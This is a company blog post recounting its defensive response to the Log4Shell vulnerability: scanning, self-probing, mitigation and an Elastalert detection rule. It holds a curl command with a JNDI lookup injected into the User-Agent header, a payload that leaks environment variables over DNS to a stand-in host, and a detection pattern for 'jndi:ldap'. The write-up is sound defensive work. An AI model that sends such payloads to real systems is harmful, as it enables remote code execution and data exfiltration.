<!doctype html>
<html lang="jp" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Zero-day vulnerabilities - Log4j | Working Group Two</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.wgtwo.com/jp/img/wgtwo-logo.png"><meta data-rh="true" name="twitter:image" content="https://www.wgtwo.com/jp/img/wgtwo-logo.png"><meta data-rh="true" property="og:url" content="https://www.wgtwo.com/jp/blog/log4j-security-vulnerability/"><meta data-rh="true" name="docusaurus_locale" content="jp"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="jp"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" name="og:description" content="We help mobile operators innovate at scale, reduce cost and dive into new revenue streams - by building a mobile core network from the ground up and delivering it as-a-service."><meta data-rh="true" name="og:image" content="/img/wgtwo-logo.png"><meta data-rh="true" name="keywords" content="mvne, private network, epc, 5G core, mvno, IMS core, mobile core, evolved packet core epc, mvno core, core as a service&#x27;"><meta data-rh="true" property="og:title" content="Zero-day vulnerabilities - Log4j | Working Group Two"><meta data-rh="true" name="description" content="On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation."><meta data-rh="true" property="og:description" content="On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation."><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2021-12-17T00:00:00.000Z"><meta data-rh="true" property="article:author" content="https://www.linkedin.com/in/jonnathangriffin/,https://www.linkedin.com/in/yangrunenberger/"><meta data-rh="true" property="article:tag" content="security,infrastructure,vulnerability"><link data-rh="true" rel="icon" href="/jp/img/favicons/favicon.ico"><link data-rh="true" rel="canonical" href="https://www.wgtwo.com/jp/blog/log4j-security-vulnerability/"><link data-rh="true" rel="alternate" href="https://www.wgtwo.com/blog/log4j-security-vulnerability/" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.wgtwo.com/jp/blog/log4j-security-vulnerability/" hreflang="jp"><link data-rh="true" rel="alternate" href="https://www.wgtwo.com/blog/log4j-security-vulnerability/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/jp/blog/rss.xml" title="Working Group Two RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/jp/blog/atom.xml" title="Working Group Two Atom Feed">



<!-- Google Tag Manager -->
    <script>!function(e,t,a,n,g){e[n]=e[n]||[],e[n].push({"gtm.start":(new Date).getTime(),event:"gtm.js"});var m=t.getElementsByTagName(a)[0],r=t.createElement(a);r.async=!0,r.src="https://www.googletagmanager.com/gtm.js?id=GTM-N4969FH",m.parentNode.insertBefore(r,m)}(window,document,"script","dataLayer")</script>
    <!-- End Google Tag Manager --><link rel="stylesheet" href="/jp/assets/css/styles.a9c7af0a.css">
<link rel="preload" href="/jp/assets/js/runtime~main.af9a854b.js" as="script">
<link rel="preload" href="/jp/assets/js/main.26f7d5ce.js" as="script">
</head>
<body class="navigation-with-keyboard" data-theme="light">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><div class="announcementBar_mb4j" style="background-color:#000000;color:#b8b8b8" role="banner"><div class="content_knG7 announcementBarContent_xLdY"><a class="announcementBarLinkContainer" target="_blank" href="https://blogs.cisco.com/news/cisco-announces-intent-to-acquire-working-group-two"><img src="/img/cisco.png"><b>Working Group Two is now part of Cisco</b><span class="separator"> | </span><span>Learn more →</span></a></div></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" target="_self" href="/jp/"><div class="navbar__logo"><img src="/jp/img/logo.svg" alt="wgtwo Logo" class="themedImage_ToTc themedImage--light_HNdA" height="32px" width="191px"><img src="/jp/img/logo_white.svg" alt="wgtwo Logo" class="themedImage_ToTc themedImage--dark_i4oU" height="32px" width="191px"></div></a><a class="navbar__item navbar__link" target="_self" href="/jp/technology/">Technology</a><a class="navbar__item navbar__link" target="_self" href="/jp/product-ecosystem/">Product Ecosystem</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Showcase</a><ul class="dropdown__menu"><li><a class="dropdown__link" href="/jp/showcase/mobi/">Mobi (MVNO/MNO)</a></li><li><a class="dropdown__link" href="/jp/showcase/ckh-iod/">CKH IOD (MVNE)</a></li><li><a class="dropdown__link" href="/jp/showcase/telenorconnexion/">Telenor Connexion (IoT)</a></li><li><a class="dropdown__link" href="/jp/showcase/mki/">MKI (Private Networks)</a></li></ul></div></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/jp/careers/">Join the Team 🎉</a><a class="navbar__item navbar__link" href="/jp/blog/">Blog</a><a class="navbar__item navbar__link sign-up" href="/jp/contact/">Talk to us</a><div class="searchBox_ZlJk"><div class="dsla-search-wrapper"><div class="dsla-search-field" data-tags="default,docs-default-current"></div></div></div><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link localeDropdown"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>日本語</a><ul class="dropdown__menu"><li><a href="/blog/log4j-security-vulnerability/" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="en">English</a></li><li><a href="/jp/blog/log4j-security-vulnerability/" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="jp">日本語</a></li></ul></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 blogBackground_WB8r"><div class="container margin-vert--lg"><div class="row"><main class="col col8_DrcQ colOffset1_fYNX singleBlogPageView_LeVK" itemscope="" itemtype="http://schema.org/Blog"><div style="position:fixed;height:4px;background-color:#edf6fa;z-index:999;width:100%;top:0;left:0"><div style="background-color:#93ddff;transition:all 0.5s ease-out;width:0%;height:100%"></div></div><article class="articleContainer_Rf03" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header class="articleCardHeader_doJu"><h1 class="title_xvU1" itemprop="headline">Zero-day vulnerabilities - Log4j</h1><div class="container_iJTo margin-vert--md"><div class="dateContainer_S5xq"><time datetime="2021-12-17T00:00:00.000Z" itemprop="datePublished">December 17, 2021</time> · <!-- -->10 min read</div><div class="iconsContainer_WcqX"><button class="button_jnFd"><svg height="500" width="500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" class="icon_K6Vf"><path d="M50 0C22.3 0 0 22.3 0 50v400c0 27.7 22.3 50 50 50h400c27.7 0 50-22.3 50-50V50c0-27.7-22.3-50-50-50H50zm89.906 105.781c19.182 0 34.719 15.537 34.719 34.719 0 19.182-15.537 34.75-34.719 34.75-19.182 0-34.719-15.568-34.719-34.75 0-19.182 15.537-34.719 34.72-34.719zm181.875 90.438c3.922.014 7.925.199 13.313.531 26.184 1.615 55.36 22.08 56.219 70.031.706 39.493.5 102.081.5 125.125H332.28c0-23.574.25-72.274.25-106.719 0-15.672-7.035-36.75-32.094-36.75-27.597 0-34.312 25.645-34.312 36.75 0 33.074-.281 85.752-.281 106.72h-59.188c0-35.345.375-156.654.375-190.907 30.568 0 45.191-.063 56.375-.063 0 11.218-.094 18.722-.094 26.907 9.337-18.852 34.832-30.655 45.75-31.219 4.98-.257 8.797-.42 12.72-.406zm-211.594 5.531h59.344v190.063h-59.344V201.75z" style="fill-opacity:1;fill-rule:nonzero"></path></svg></button><button class="button_jnFd"><svg xmlns="http://www.w3.org/2000/svg" height="56.693" width="56.693" viewBox="0 0 56.693 56.693" xml:space="preserve" class="icon_K6Vf"><rect width="100%" height="100%" fill="none"></rect><g class="currentLayer"><title>Layer 1</title><path d="M56.237 11.546a22.859 22.859 0 0 1-6.598 1.809 11.509 11.509 0 0 0 5.051-6.357 22.997 22.997 0 0 1-7.295 2.79 11.473 11.473 0 0 0-8.385-3.629c-6.344 0-11.488 5.144-11.488 11.489 0 .899.101 1.775.298 2.618-9.548-.48-18.014-5.053-23.68-12.004a11.43 11.43 0 0 0-1.555 5.777c0 3.985 2.027 7.502 5.11 9.562a11.456 11.456 0 0 1-5.204-1.438v.145c0 5.565 3.96 10.208 9.215 11.265a11.55 11.55 0 0 1-5.189.195c1.463 4.564 5.705 7.887 10.732 7.979A23.047 23.047 0 0 1 2.98 46.665c-.926 0-1.841-.055-2.74-.161a32.51 32.51 0 0 0 17.61 5.161c21.132 0 32.687-17.505 32.687-32.686 0-.498-.01-.995-.032-1.488a23.268 23.268 0 0 0 5.731-5.945z" class="selected"></path></g></svg></button><button class="button_jnFd"><svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" viewBox="0 0 256 256" class="icon_K6Vf"><rect width="100%" height="100%" fill="none"></rect><g class="currentLayer"><title>Layer 1</title><path fill="none" d="M0 0h256v256H0z"></path><path d="M255.429 115.27a33.99 33.99 0 0 0-56.19-25.705c-17.844-9.453-39.088-15.189-61.287-16.464l5.523-33.14 23.156 3.612a25.705 25.705 0 1 0 2.655-16.783l-31.547-4.886a8.497 8.497 0 0 0-9.666 7.01l-7.329 44.081c-23.155.956-45.46 6.692-64.049 16.57a33.99 33.99 0 0 0-45.249 50.666 65.218 65.218 0 0 0-2.443 17.526c0 23.262 12.746 45.037 36.008 61.076s51.728 23.899 82.956 23.899 60.65-8.498 82.957-23.9 36.007-37.813 36.007-61.075a63.837 63.837 0 0 0-2.443-17.42 34.415 34.415 0 0 0 10.94-25.067zM68.485 145.011a16.995 16.995 0 1 1 16.995 16.995 16.995 16.995 0 0 1-16.995-16.995zm98.464 54.277a85.08 85.08 0 0 1-77.964 0 8.497 8.497 0 0 1 7.754-15.082 68.192 68.192 0 0 0 62.456 0 8.497 8.497 0 0 1 7.754 15.082zm3.505-37.282a16.995 16.995 0 1 1 16.995-16.995 16.995 16.995 0 0 1-16.995 16.995z"></path></g></svg></button><span class="spacer_N6vp">|</span><button class="button_jnFd"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="icon_K6Vf iconLink_fFIC"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"></path></svg></button></div></div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_q4o9"><div class="avatar margin-bottom--sm"><a href="https://www.linkedin.com/in/jonnathangriffin/" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="/img/author-photos/jg.jpg" alt="Jonny Griffin"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://www.linkedin.com/in/jonnathangriffin/" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Jonny Griffin</span></a></div><small class="avatar__subtitle" itemprop="description" title="Security Tech Lead">Security Tech Lead</small></div></div></div><div class="col col--6 authorCol_q4o9"><div class="avatar margin-bottom--sm"><a href="https://www.linkedin.com/in/yangrunenberger/" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="/img/author-photos/yg.jpg" alt="Yan Grunenberger"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://www.linkedin.com/in/yangrunenberger/" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Yan Grunenberger</span></a></div><small class="avatar__subtitle" itemprop="description" title="Software Engineer for Session Management &amp; Protocol Termination">Software Engineer for Session Management &amp; Protocol Termination</small></div></div></div></div></header><div id="__blog-post-container" class="markdown articleContent_wrOu" itemprop="articleBody"><p>On Friday, December 10th, <strong>wgtwo</strong> and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="friday">Friday<a href="#friday" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h2><p>Mitigating 3rd party vulnerabilities is an ability that <strong>wgtwo</strong> has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture.</p><p>We knew that all versions of Log4j <code>2.0-beta9 &lt;= Apache log4j &lt;= 2.14.1</code> were affected.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="code">Code<a href="#code" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h3><p>Naturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="docker-vulnerability-scan-day-1">Docker Vulnerability Scan Day 1<a href="#docker-vulnerability-scan-day-1" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h3><p>We use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry.</p><p>At a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy’s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="saturday">Saturday<a href="#saturday" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="checking-our-infrastructure-ourselves-with-dns-requests">Checking our infrastructure ourselves with DNS requests<a href="#checking-our-infrastructure-ourselves-with-dns-requests" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h3><p>At that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j.</p><p>One harmless way to detect vulnerability is to exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:</p><p><img loading="lazy" src="/jp/assets/images/01-canary-tokens-f983dacab054f367bad1da172173f916.png" width="1254" height="692" class="img_ev3q"></p><p>If a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">curl https://docs.wgtwo.com  -A &quot;\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature.</p><p>JNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world.</p><p>Going back to our problem, we quickly found this <a href="https://github.com/veracode-research/rogue-jndi" target="_blank" rel="noopener noreferrer">Rogue JNDI</a>. This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:</p><p><img loading="lazy" src="/jp/assets/images/02-supported-payloads-a00c9b2b8c1fbe6da7493e687868530a.png" width="1242" height="392" class="img_ev3q"></p><p>In particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then, we should proceed to:
1) Identify if the affected components are in our stack or in the cloud provider
2) Apply mitigation</p><ul><li>Either via WAF - firewall rules on traffic.</li><li>Either via known mitigation on the log4g components<ul><li>Environment variable / JVM options</li><li>Java class removal</li><li>Full component upgrade</li></ul></li></ul><p>For (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j.</p><p>Assuming this was the only element, we proceed to apply mitigation:
We discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the <code>jndi:ldap</code> string used to trigger the vulnerability.
The environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.
Java class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="log-analysis-and-alerting">Log Analysis and Alerting<a href="#log-analysis-and-alerting" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h3><p>Just after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. <code>${jndi</code></p><p>Cloudflare wrote a great <a href="https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/" target="_blank" rel="noopener noreferrer">blog post</a> about the traffic they have seen when updating their firewall rules for preventing Log4j exploits.</p><p>For us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by <a href="https://aws.amazon.com/security/security-bulletins/AWS-2021-006/" target="_blank" rel="noopener noreferrer">AWS Security Bulletin</a>.</p><p>To get some ChatOps alerts in slack we use an open-source tool called <a href="https://github.com/Yelp/elastalert" target="_blank" rel="noopener noreferrer">Elstalert</a>. This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure.</p><p>To get started, we built the following Elastalert rule:</p><div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token key atrule">log4j.yaml</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">|</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">---</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">name</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;log4j cve&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">index</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> logstash</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain">*</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> any</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">realert</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token key atrule">minutes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">15</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token key atrule">query</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token key atrule">query_string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token key atrule">query</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;\&quot;jndi:ldap\&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">query_delay</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token key atrule">minutes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">query_key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;message&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text_type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> alert_text_only</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">include</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;kubernetes.container.name&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;message&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;slack&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> &quot;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token important">*Container*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">\n</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token important">*Message*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">&quot;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text_args</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;kubernetes.container.name&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;message&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_channel_override</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;#cve-2021-44228&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_emoji_override</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;:unlock:&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_msg_color</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> warning</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_title</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> Security RCE attempt for CVE</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain">2021</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token number" style="color:rgb(247, 140, 108)">44228</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 